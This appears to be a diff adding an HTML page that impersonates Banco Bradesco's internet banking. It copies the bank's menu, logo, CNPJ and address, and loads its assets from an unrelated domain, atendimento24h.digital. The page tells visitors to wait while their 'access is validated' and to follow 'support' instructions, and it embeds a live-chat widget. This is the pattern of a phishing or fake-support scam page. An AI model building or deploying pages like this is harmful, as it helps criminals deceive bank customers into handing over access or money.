@@ -1,0 +1,206 @@
+
+<!doctype html>
+<html lang="pt-BR" ng-app="app" ng-controller="onlineController">
+<head>
+    <meta charset="utf-8">
+    <meta name="csrf-token" content="AM282UAX77K0ERQmaydST0urKc86y6CxjFQrWvFN">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Atendimento</title>
+
+                        <meta name="theme-color" content="#f31d5d" />
+            <meta name="apple-mobile-web-app-status-bar-style" content="#f31d5d" />
+            <meta name="msapplication-navbutton-color" content="#f31d5d" />
+            <meta name="color-scheme" content="light">
+            
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.bunny.net">
+    <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&display=swap" rel="stylesheet" />
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+
+    <link rel="stylesheet" type="text/css" href="https://atendimento24h.digital/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="https://atendimento24h.digital/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://atendimento24h.digital/lightbox.min.css">
+    <link rel="stylesheet" type="text/css" href="https://atendimento24h.digital/style.css">
+
+    <style>
+        :root {
+            --cor_primaria:#ffffff;
+            --cor_primaria_texto:#e1173f;
+            --cor_primaria_hover:#e1173f;
+            --cor_primaria_texto_hover:#ffffff;
+            --cor_secundaria:#e1173f;
+            --cor_secundaria_texto:#000000;
+            --cor_secundaria_hover:#ffffff;
+            --cor_secundaria_texto_hover:#6c757d;
+            --cor_tercearia:#e1173f;
+            --cor_tercearia_texto:#f2f2f2;
+            --cor_tercearia_hover:#ffffff;
+            --cor_tercearia_texto_hover:#000000;
+            --cor_fundo_um:#ffffff;
+            --cor_fundo_dois:#f5f5f4;
+            --cor_fundo_tres:#ffffff;
+            --cor_fundo_quatro:#e1173f;
+            color-scheme: only light;
+        }
+    </style>
+
+</head>
+
+
+
+<body class="bg-cinza-senha w-100 vh-100 d-flex flex-column justify-content-between">
+<style>
+    .vh-100{
+        height: 100svh !important;
+        min-height: -webkit-fill-available;
+        min-height: -webkit-fill-available;
+        min-height: -moz-available;
+        min-height: fill-available;
+
+    }
+
+</style>
+
+
+
+    <div class="container-fluid meuvarejo xp-barrasite fixed-top barra-NORMAL">
+        <div class="container d-flex flex-row justify-content-between align-items-center py-0 h-100">
+            <div class="tela-logo">
+                                    <img src="https://atendimento24h.digital/images/logo-mobile.png" width="141px"  class="">
+                            </div>
+            <div class="flex-fill pt-4 ps-4">
+            </div>
+
+            <div class="unidade pt-1 d-flex flex-row">
+                <div>
+                </div>
+                <div class="ps-4">
+                    <div class="rounded-circle time d-flex flex-column align-items-center justify-items-center">
+                        <p class="mb-0 fw-bold text-white pt-1">20</p>
+                        <p class="mb-0 fs-8 text-white position-relative" style="top: -4px">MIN</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tela-voltarsite">
+                <button class="btn btn-cancelar fs-7 fw-medium text-white" style="opacity: 1">Sair
+                </button>
+            </div>
+        </div>
+    </div>
+    <div class="container-fluid py-1 bg-white sombra-menu fixed-top">
+        <nav class="navbar navbar-expand-lg bg-body-tertiary">
+            <div class="container-fluid">
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse mx-auto" id="navbarSupportedContent">
+                    <ul class="navbar-nav mx-auto mb-2 mb-lg-0">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Início</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Saldos e Extratos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Pagamentos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Pix</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Transfências</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Cartões</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Empréstimo</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Ágora Home Broker</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Investimentos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Open Finance</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#"  class="nav-link mx-1 fs-7-5 fw-medium" aria-disabled="true">Mais opções</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </div>
+
+    <div class="d-flex flex-row justify-content-center align-items-center flex-fill p-5 pt-0" style="margin-top: 140px">
+        <div class="container sombrinha rounded-bottom bg-white d-flex flex-column justify-content-center align-items-center">
+            <div class="xp-fisica flex-fill" style="padding-top: 90px !important;padding-bottom: 90px">
+                <h4 class="montserrat text-center fw-light mb-4">
+                    Aguarde enquanto validamos o seu acesso, Enquato isso siga as instruções do nosso suporte
+                </h4>
+                <p class="w-100 text-center">
+                    <img src="https://atendimento24h.digital/images/loader.gif" width="70px">
+                </p>
+            </div>
+
+        </div>
+    </div>
+    <div class="position-fixed top-0 mt-5 pt-3 w-100 d-flex flex-row align-content-center justify-content-center d-none" id="alerta">
+        <p class="d-block bg-danger p-3 rounded shadow text-white text-center fw-medium" id="msg" style="max-width: 400px">
+            Mensagem do alerta
+        </p>
+    </div>
+
+    <script src="//code.jivosite.com/widget/5LNfvSegwM" async></script>
+
+
+
+
+
+    <link rel="stylesheet" href="carregar.css">
+
+
+<footer>
+    <div class="footer-container">
+        <div class="left-section">
+            <img src="/images/logobrada.png" alt="Logo Empresa" class="footer-logo">
+        </div>
+
+        <div class="center-section">
+            <p>Banco Bradesco SA | CNPJ: 60.746.948.0001-12</p>
+            <p>Cidade de Deus, s/nº Vila Yara | Osasco | SP | CEP: 06029-900</p>
+        </div>
+
+        <div class="right-section">
+            <span style="font-weight: bold; font-size: 13px;">ACOMPANHE:</span>
+            <img src="/images/icons8-facebook-num-círculo-500.png" alt="Logo Empresa" style="width: 35px; height: auto;">
+            <img src="/images/icons8-instagram-500.png" alt="Logo Empresa" style="width: 35px; height: auto;">
+            <img src="/images/icons8-tiktok-500.png" alt="Logo Empresa" style="width: 35px; height: auto;">
+            <img src="/images/icons8-x-500.png" alt="Logo Empresa" style="width: 35px; height: auto;">
+            <img src="/images/icons8-youtube-500.png" alt="Logo Empresa" style="width: 35px; height: auto;">
+
+
+            
+</footer>
+
+<p class="copyright">2025 Banco Bradesco S.A. Todos os direitos reservados.</p>
+
+<style>
+  .copyright {
+    text-align: center; /* Centraliza o texto */
+  }
+</style>
+
+</footer>
+
+</html>
